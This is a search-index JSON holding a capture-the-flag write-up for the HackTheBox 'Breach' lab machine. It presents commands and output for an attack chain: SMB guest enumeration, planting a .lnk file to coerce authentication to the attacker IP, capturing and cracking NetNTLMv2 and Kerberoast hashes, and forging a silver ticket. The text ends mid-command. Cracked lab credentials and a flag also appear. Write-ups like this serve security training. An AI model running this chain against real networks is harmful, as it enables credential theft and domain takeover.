{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Deliverables","text":"<p>Here you might find writeups for CTF challenges, retired HTB/Offsec lab machines, etc.  Maybe a blog to talk about security-related topics involving CTFs or challenges.</p>"},{"location":"writeups/HackTheBox/Machines/Breach/","title":"Breach","text":"<p>Nmap scan of the target host <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.38.236\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 22:54 PDT\nNmap scan report for 10.129.38.236\nHost is up (0.10s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-25 05:55:31Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.129.38.236:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-10-25T05:56:19\n|_Not valid after:  2055-10-25T05:56:19\n| ms-sql-ntlm-info: \n|   10.129.38.236:1433: \n|     Target_Name: BREACH\n|     NetBIOS_Domain_Name: BREACH\n|     NetBIOS_Computer_Name: BREACHDC\n|     DNS_Domain_Name: breach.vl\n|     DNS_Computer_Name: BREACHDC.breach.vl\n|     DNS_Tree_Name: breach.vl\n|_    Product_Version: 10.0.20348\n|_ssl-date: 2025-10-25T09:57:48+00:00; 0s from scanner time.\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BREACH\n|   NetBIOS_Domain_Name: BREACH\n|   NetBIOS_Computer_Name: BREACHDC\n|   DNS_Domain_Name: breach.vl\n|   DNS_Computer_Name: BREACHDC.breach.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-10-25T05:55:48+00:00\n|_ssl-date: 2025-10-25T05:56:27+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=BREACHDC.breach.vl\n| Not valid before: 2025-09-07T08:04:48\n|_Not valid after:  2026-03-09T08:04:48\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-10-25T05:55:52\n|_  start_date: N/A\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   105.63 ms 10.10.14.1\n2   105.65 ms 10.129.38.236\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 106.28 seconds\n</code></pre></p> <p>As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using tooling for this purpose https://github.com/SYANiDE-/tooling</p> <ul> <li>entries in /etc/hosts<ul> <li><code>echo \"10.129.38.236 breachdc.breach.vl breach.vl breach breachdc\" | sudo tee -a /etc/hosts</code></li> </ul> </li> <li>/etc/resolv.conf<ul> <li><code>domain breach.vl</code></li> <li><code>nameserver 10.129.38.236</code></li> </ul> </li> <li>/etc/krb5.conf<ul> <li><code>sudo make_krb5.conf.py -d breachdc.breach.vl -w</code></li> </ul> </li> <li>timesync to the domain controller<ul> <li><code>sudo systemctl start vbox-disable-timesync.service</code></li> <li><code>sudo ntpdate -u breachdc</code></li> </ul> </li> </ul>"},{"location":"writeups/HackTheBox/Machines/Breach/#enumeration","title":"enumeration","text":"<p>The guest account is enabled <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\"\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest:\n</code></pre></p> <p>The guest account has read/write on the <code>share</code> share, and read permissions on the <code>users</code> share. <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" --shares\nSMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.129.38.236   445    BREACHDC         [+] breach.vl\\guest: \nSMB         10.129.38.236   445    BREACHDC         [*] Enumerated shares\nSMB         10.129.38.236   445    BREACHDC         Share           Permissions     Remark\nSMB         10.129.38.236   445    BREACHDC         -----           -----------     ------\nSMB         10.129.38.236   445    BREACHDC         ADMIN$                          Remote Admin\nSMB         10.129.38.236   445    BREACHDC         C$                              Default share\nSMB         10.129.38.236   445    BREACHDC         IPC$            READ            Remote IPC\nSMB         10.129.38.236   445    BREACHDC         NETLOGON                        Logon server share \nSMB         10.129.38.236   445    BREACHDC         share           READ,WRITE      \nSMB         10.129.38.236   445    BREACHDC         SYSVOL                          Logon server share \nSMB         10.129.38.236   445    BREACHDC         Users           READ\n</code></pre></p> <p>In the <code>share</code> share: <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-pass\n\n[...]\n# ls\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:19:36 2022 finance\ndrw-rw-rw-          0  Thu Feb 17 03:19:13 2022 software\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 transfer\n# cd transfer\n# pwd\n/transfer\n# ls\ndrw-rw-rw-          0  Mon Sep  8 03:13:44 2025 .\ndrw-rw-rw-          0  Sat Oct 25 00:35:33 2025 ..\ndrw-rw-rw-          0  Thu Feb 17 03:23:51 2022 claire.pope\ndrw-rw-rw-          0  Thu Feb 17 03:23:22 2022 diana.pope\ndrw-rw-rw-          0  Wed Apr 16 17:38:12 2025 julia.wong\n</code></pre></p> <p>None of these directories are accessible by guest.  But they are usernames, which might come in handy.</p> <p>The other folders, <code>finance</code> and <code>software</code> are empty.</p> <p>These users don't have DONT_REQUIRE_PREAUTH set <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetNPUsers -dc-host breachdc.breach.vl -usersfile users.txt breach.vl/guest -no-pass\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] User claire.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User diana.pope doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User julia.wong doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre></p> <p>I used the slinky module to place an .ico on the <code>share</code> share,  <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -u guest -p \"\" -M slinky -o SERVER=10.10.14.204 NAME=funtime ICO_URI=\\\\\\\\10.10.14.204\\\\test\\\\icon.ico SHARES=share/software IGNORE=c\\$,admin\\$,netlogon,sysvol,users --smb-timeout 10\n</code></pre></p> <p>downloaded it, then re-uploaded it into all three folders using impacket-smbclient: <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-passImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\nType help for list of commands\n# ls\ndrw-rw-rw-          0  Sat Oct 25 01:25:14 2025 .\ndrw-rw-rw-          0  Tue Sep  9 03:35:32 2025 ..\ndrw-rw-rw-          0  Sat Oct 25 01:20:09 2025 finance\ndrw-rw-rw-          0  Sat Oct 25 01:19:56 2025 software\ndrw-rw-rw-          0  Sat Oct 25 01:20:34 2025 transfer\n# use share\n# cd finance\n# put funtime.lnk\n# cd ../software\n# put funtime.lnk\n# cd ../transfer\n# put funtime.lnk\n</code></pre></p> <p>Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP authentication <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/breach]\n\u2514\u2500$ sudo responder -I tun0 -A\n[sudo] password for notroot: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n\n[+] Poisoners:\n    LLMNR                      [OFF]\n    NBT-NS                     [OFF]\n    MDNS                       [OFF]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.204]\n    Responder IPv6             [dead:beef:2::10ca]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    Don't Respond To MDNS TLD  ['_DOSVC']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-DHPV0P7ZJXQ]\n    Responder Domain Name      [SAHT.LOCAL]\n    Responder DCE-RPC Port     [47411]\n\n[*] Version: Responder 3.1.7.0\n[*] Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;\n[*] To sponsor Responder: https://paypal.me/PythonResponder\n\n[+] Listening for events...\n\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (10.129.38.236).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.204) is not on the same subnet than the DNS server (192.168.50.1).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[SMB] NTLMv2-SSP Client   : 10.129.38.236\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:b8e16237cccbf32c:374403FAE1D07A04042DB4FBA1642BD5:0101000000000000801EB0A04C45DC0113874E71A609ED8E0000000002000800530041004800540001001E00570049004E002D0044004800500056003000500037005A004A005800510004003400570049004E002D0044004800500056003000500037005A004A00580051002E0053004100480054002E004C004F00430041004C000300140053004100480054002E004C004F00430041004C000500140053004100480054002E004C004F00430041004C0007000800801EB0A04C45DC0106000400020000000800300030000000000000000100000000200000D0EFE4A5B18E1ACF4FD3A7E00E6BC2F32D639EC43CD9B40C9FA69C3E42C199EC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300034000000000000000000\n</code></pre></p> <p>I was then able to crack the hash quite easily <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify julia.wong.netntlmv2-ssp \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n   5600 | NetNTLMv2                                                  | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 5600 julia.wong.netntlmv2-ssp /usr/share/wordlists/rockyou.txt --force --quiet\nJULIA.WONG::BREACH:b8e16237cccbf32c:374403fae1d07a04042db4fba1642bd5:0101000000000000801eb0a04c45dc0113874e71a609ed8e0000000002000800530041004800540001001e00570049004e002d0044004800500056003000500037005a004a005800510004003400570049004e002d0044004800500056003000500037005a004a00580051002e0053004100480054002e004c004f00430041004c000300140053004100480054002e004c004f00430041004c000500140053004100480054002e004c004f00430041004c0007000800801eb0a04c45dc0106000400020000000800300030000000000000000100000000200000d0efe4a5b18e1acf4fd3a7e00e6bc2f32d639ec43cd9b40c9fa69c3e42c199ec0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300034000000000000000000:Computer1\n</code></pre></p> <p>Credential: <pre><code>julia.wong:Computer1\n</code></pre></p> <p>Get a ccache <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/julia.wong:Computer1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ export KRB5CCNAME=$(pwd)/julia.wong.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ klist\nTicket cache: FILE:/home/notroot/htb/machines/breach/julia.wong.ccache\nDefault principal: julia.wong@BREACH.VL\n\nValid starting       Expires              Service principal\n10/25/2025 01:29:19  10/25/2025 11:29:19  krbtgt/BREACH.VL@BREACH.VL\n        renew until 10/26/2025 01:29:19\n</code></pre></p>"},{"location":"writeups/HackTheBox/Machines/Breach/#what-can-juliawong-do","title":"What can julia.wong do","text":"<p>read/write on the <code>share</code> share, and read on the <code>users</code> share <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ nxc smb breachdc.breach.vl -k --use-kcache --shares\nSMB         breachdc.breach.vl 445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         breachdc.breach.vl 445    BREACHDC         [+] BREACH.VL\\julia.wong from ccache \nSMB         breachdc.breach.vl 445    BREACHDC         [*] Enumerated shares\nSMB         breachdc.breach.vl 445    BREACHDC         Share           Permissions     Remark\nSMB         breachdc.breach.vl 445    BREACHDC         -----           -----------     ------\nSMB         breachdc.breach.vl 445    BREACHDC         ADMIN$                          Remote Admin\nSMB         breachdc.breach.vl 445    BREACHDC         C$                              Default share\nSMB         breachdc.breach.vl 445    BREACHDC         IPC$            READ            Remote IPC\nSMB         breachdc.breach.vl 445    BREACHDC         NETLOGON        READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         share           READ,WRITE      \nSMB         breachdc.breach.vl 445    BREACHDC         SYSVOL          READ            Logon server share \nSMB         breachdc.breach.vl 445    BREACHDC         Users           READ\n</code></pre></p> <p>Nothing particularly interesting in the <code>users</code> share for julia.wong, but the <code>share</code> share, julia.wong directory, found a user.txt.</p> <p>Flag: <pre><code># pwd\n/transfer/julia.wong\n# cat user.txt\n55d33e52bc5fa7a687b9f0dcfa103dda\n</code></pre></p> <p>Get a list of usernames <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetADUsers -k -no-pass -all breach.vl/julia.wong@breachdc.breach.vl  | awk '{print $1}'\nImpacket\n\n[*]\n[*]\nName\n--------------------\nAdministrator\nGuest\nkrbtgt\nClaire.Pope\nJulia.Wong\nHilary.Reed\nDiana.Pope\nJasmine.Price\nGeorge.Williams\nLawrence.Kaur\nJasmine.Slater\nHugh.Watts\nChristine.Bruce\nsvc_mssql\n</code></pre></p> <p>When trying to kerberoast users, I found a type 18 hash for krbtgt (typically uncrackable), and a type 23 for user svc_mssql, really only the latter is interesting/likely. <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-GetUserSPNs -k -no-pass -usersfile usernames.txt breach.vl/julia.wong@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[...]\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc\n</code></pre></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat --identify svc_mssql.hash \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol\n\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt --force --quiet \n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc:Trustno1\n</code></pre> <p>Credential: <pre><code>svc_mssql:Trustno1\n</code></pre></p> <p>Get a ccache <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/svc_mssql:Trustno1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in svc_mssql.ccache\n</code></pre></p> <p>This is a good start.  Lets examine with Bloodhound.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ bloodhound-ce-python -k -no-pass -d breach.vl -u julia.wong -dc breachdc.breach.vl -c all --zip -op bloody\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: breach.vl\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal in ccache file.\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 15 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BREACHDC.breach.vl\nINFO: Done in 00M 26S\nINFO: Compressing output into 20251025015627_bloodhound.zip\n</code></pre> <p>Interestingly, Julia.wong is a member of Staff and Print Operators. </p> <p>There is nothing particularly interesting about the Staff group, but Print Operators: https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators <pre><code>The **Print Operators** group is a highly privileged group in Windows that grants its members several significant permissions, including:\n\n- `**SeLoadDriverPrivilege**`: Allows members to load and manage system drivers.\n\n- The ability to manage, create, share, and delete printers connected to a Domain Controller.\n\n- The ability to log on locally to a Domain Controller and shut it down.\n</code></pre></p> <p>There is also the potential to execute shellcode in the context of NT AUTHORITY\\System, using the Capcom.sys driver.</p> <p>Maybe this is something, maybe it is not.  I might circle back to this. </p> <p>One other thing I saw was that there is a domain admin user, christine.bruce, which has password not required set:</p> <p></p> <p>That is pretty interesting, but not sure how that could work out from here.</p>"},{"location":"writeups/HackTheBox/Machines/Breach/#get-shell","title":"Get shell","text":"<p>Both of my controlled users are guests on the mssql instance <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/julia.wong:Computer1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Julia.Wong  guest@master)&gt; exit\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/svc_mssql:Trustno1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\svc_mssql  guest@master)&gt; exit\n</code></pre></p> <p>I do have the credentials for the svc_mssql user, and their spn is <code>MSSQLSvc/breachdc.breach.vl:1433</code>.  I could forge a silver ticket for that SPN for christine.  Lets do that</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ cat ~/bin/password_to_ntlm_hash.py \n#!/usr/bin/env python3\nimport hashlib\nimport binascii\n\ndef convert_to_ntlm(password):\n    encoded_password = password.encode('utf-16le')\n    md4_hash = hashlib.new('md4', encoded_password).digest()\n    ntlm_hash = binascii.hexlify(md4_hash).decode('utf-8')\n    return ntlm_hash\n\npassword = input(\"Give password:&gt; \")\nntlm_hash = convert_to_ntlm(password)\nprint(f\"Password: {password}\")\nprint(f\"NTLM Hash: {ntlm_hash}\")\n</code></pre> <p>Hash svc_mssqls password <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ ~/bin/password_to_ntlm_hash.py\nGive password:&gt; Trustno1\nPassword: Trustno1\nNTLM Hash: 69596c7aa1e8daee17f8e78870e25a5c\n</code></pre></p> <p>Forge a service ticket for christine.bruce, for the MSSQLSvc/ SPN. <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-ticketer -domain breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl:1433 -nthash 69596c7aa1e8daee17f8e78870e25a5c 